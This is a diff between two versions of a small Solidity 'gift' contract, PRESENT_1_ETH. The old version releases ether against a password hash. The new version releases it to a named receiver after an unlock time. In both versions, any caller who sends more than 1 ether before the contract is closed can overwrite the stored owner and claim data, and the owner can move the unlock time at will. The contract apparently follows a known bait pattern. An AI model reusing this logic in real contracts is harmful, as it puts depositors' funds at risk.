@@ -1,57 +1,57 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PRESENT_1_ETH at 0x7b3c3A05FCbf18dB060EF29250769CEe961D75aC
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PRESENT_1_ETH at 0x6f905E47d3e6A9Cc286b8250181Ee5A0441Acc81
 */
 pragma solidity ^0.4.19;
 
 contract PRESENT_1_ETH
 {
-    bool passHasBeenSet = false;
-    
     address sender;
     
-    bytes32 public hashPass;
-	
-	function() public payable{}
+    address reciver;
     
-    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
+    bool closed = false;
     
-    function SetPass(bytes32 hash)
+    uint unlockTime;
+ 
+    function PutGift(address _reciver)
     public
     payable
     {
-        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
+        if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )
         {
-            hashPass = hash;
             sender = msg.sender;
+            reciver = _reciver;
+            unlockTime = now;
         }
     }
     
-    function GetGift(bytes pass)
-    external
+    function SetGiftTime(uint _unixTime)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            unlockTime = _unixTime;
+        }
+    }
+    
+    function GetGift()
+    public
     payable
     {
-        if(hashPass == sha3(pass))
+        if(reciver==msg.sender&&now>unlockTime)
         {
             msg.sender.transfer(this.balance);
         }
     }
     
-    function Revoce()
+    function CloseGift()
     public
-    payable
     {
-        if(msg.sender==sender)
+        if(sender == msg.sender && reciver != 0x0 )
         {
-            sender.transfer(this.balance);
+           closed=true;
         }
     }
     
-    function PassHasBeenSet(bytes32 hash)
-    public
-    {
-        if(msg.sender==sender&&hash==hashPass)
-        {
-           passHasBeenSet=true;
-        }
-    }
+    function() public payable{}
 }
